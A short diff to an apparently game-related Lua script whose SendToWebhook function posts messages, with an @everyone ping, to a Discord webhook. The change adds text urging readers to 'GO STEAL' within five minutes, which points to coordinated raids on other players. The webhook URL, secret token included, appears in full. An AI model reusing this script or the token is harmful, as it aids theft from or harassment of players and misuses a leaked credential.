@@ -8,7 +8,7 @@ local function SendToWebhook(text)
     local url = "https://discord.com/api/webhooks/1443757360605564978/_DWO8U138x_7GGt4kQLW9X-kTJr9MLRvy-iV6DzEvNwJWZq1vccqHuuM-KFQTEWfg7_B"
 
     local data = {
-        content = "@everyone NEW LINK!! " .. text,
+        content = "@everyone NEW LINK!! THERES ONLY 5 MINUTES UNTIL THEY GET REJOINED! SO GO STEAL! " .. text,
         allowed_mentions = { parse = { "everyone" } }
     }
 
